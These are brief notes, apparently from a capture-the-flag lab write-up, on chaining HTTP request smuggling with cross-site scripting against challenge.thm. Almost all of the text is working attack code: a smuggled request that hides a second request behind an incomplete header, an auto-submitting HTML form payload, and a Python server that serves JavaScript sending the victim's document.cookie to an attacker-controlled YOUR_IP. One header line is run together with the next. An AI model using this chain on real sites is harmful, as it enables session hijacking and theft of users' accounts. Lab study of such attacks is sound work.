
Sample payload
```http
POST / HTTP/1.1
Host: challenge.thm
Proxy-Connection: keep-alive
Content-Length: 30 Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=thm(SECRET)

GET /404 HTTP/1.1
Cookie: session=thm(SECRET)
X-Header: x
```

- Note the incomplete header `X-Header: x`, this will hide the next request and the server will assume that the actual request is `GET /404 HTTP/1.1`

- Payload for XSS attack
```html
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```

- Sample server to exfiltrate the cookies
```python
#!/usr/bin/python3

    
from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")

            self.end_headers()
            self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")  
def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```